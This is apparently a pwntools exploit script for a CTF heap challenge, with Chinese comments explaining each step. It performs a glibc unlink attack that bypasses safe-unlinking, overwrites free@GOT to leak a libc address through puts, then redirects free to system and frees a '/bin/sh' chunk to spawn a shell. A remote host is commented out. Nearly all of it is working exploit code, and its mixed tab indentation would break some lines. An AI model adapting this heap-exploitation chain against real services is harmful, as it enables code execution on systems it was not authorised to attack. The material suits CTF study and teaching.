#!/usr/bin/env python
#coding=utf-8
from pwn import *
context(arch='amd64')
p = process("./01_4-ReeHY-main")
#p = remote('211.159.216.90',51888)#211.159.216.90 51888
#libc = ELF('/root/4/ctflibc.so.6')
def create_ex(_size,_cun,_content):
    print p.recvuntil('$ ')
    p.send('1')
    print p.recvline()
    p.send(_size)
    print p.recvline()
    p.send(_cun)
    print p.recvline()
    p.send(_content)
def delete_ex(_cun):
    print p.recvuntil('$ ')
    p.send('2')
    print p.recvline()
    p.send(_cun)
def edit_ex(_cun,_content):
    print p.recvuntil('$ ')
    p.send('3')
    print p.recvline()
    p.send(_cun)
    print p.recvline()
    p.send(_content)
ptr_addr = 0x000000006020E0
free_got = 0x00000000602018
#sys_addr = 0x007ffff7a7a450
sys_rva  = 0x00000000040310
put_rva  = 0x000000000657e0
free_rva = 0x00000000076f30
def pwn():
    p.recvuntil('$ ')
    p.sendline('loudy')
    create_ex('160','0','a'*0x20)
    create_ex('160','1','b'*0x20)
    create_ex('160','2','/bin/sh;'+'c'*0x20)
    create_ex('160','3','/bin/sh;'+'e'*0x20)
    create_ex('10','-2','d'*7)
	#该地址的索引为-2，结果就覆盖到了记录大小的指针变量上，则该地址上的内容就是cun块的大小了。
	#四个cun块，且大小的记录单位为dword，所以该地址大小为16即可。前两个cun块的大小被
	#覆盖为'd'*7
    payload = p64(0x0)+p64(0xa1)+p64(ptr_addr-0x18)+p64(ptr_addr-0x10)+'a'*0x80+p64(0xa0)+p64(0xb0)
	#libc为了防止dw shoot，使用了一个叫做safe unlinking的机制。
	#该机制在unlink的相关写入操作之前，根据双向链表的特点，确定fd和bk指针的有效性，即
	#检测fd指针指向的堆块的bk指针是否指向自己(bk同理)。
	
	#所以需要有个地址，其上是被unlink的chunk地址；然后unlink的结果是该地址上的值变为该地址-0x18。
	
	
    edit_ex('0',payload)
	#《1》这里把cun0块大小设置为很大，可以修改cun1块的headr，使得cun0为空闲块；
	#《2》并构造cun0块的fd和bk指针，使得过掉safe_unlink,unlink的结果就是*&ptr_cun0addr=&ptr_cun0addr-0x18;
	#结果：cun0的地址改变到当前关键数据区域，同时cun0块大小又是很大的，所以就可以做很多事情了。
	#注意：上面&ptr_cun0addr地址上记录的是伪cun0地址，cun1_header记录的是伪cun0大小，两者刚好对应骗过glibc堆管理机制。
	
    delete_ex('1')
	raw_input("ida del??")
    #由操作过程，可知还是存放地址类的数据区域更为关键。 
    payload2 = p64(0x0)+p64(0x1)+p64(0xa)+p64(0x602018)+p64(1)+p64(0x603110)+p64(0xa)+p64(0x602020)
	#                                    free_got                                      puts_got
	#edit cun0 即是从6020e0-0x18开始编辑数据。payload2刚好用前三个填充，第四个602018刚好覆盖到6020e0，即cun0的地址了。
    edit_ex('0',payload2)
	raw_input("ida edi??")
    payload3 = '\xd0\x06\x40\x00\x00\x00\x00\x00'
	#                     puts_plt  
	#把cun0地址602018上内容edit为4006d0
    edit_ex('0',payload3)
	raw_input("ida edi??")#只是让脚本停了。。 程序并没有停下来
	#用put_plt覆盖free_got，此时调用del删除堆2，实际是调用puts显示602020(puts_got)的值。
	#即puts函数的实际地址。
    print p.recvuntil('$ ')
    p.send('2')
    print p.recvline()
    p.send('2')
	print "puts_addr"
	print p.recv(8)
    sysysys = u64(p.recv(8))%0x1000000000000
	print "puts_addr"
    print hex(sysysys)
    sysysys = sysysys-put_rva+sys_rva
    print hex(sysysys)
    edit_ex('0',p64(sysysys))
    delete_ex('3')
	raw_input("ida del??")
raw_input("ida attach??")
pwn()
p.interactive()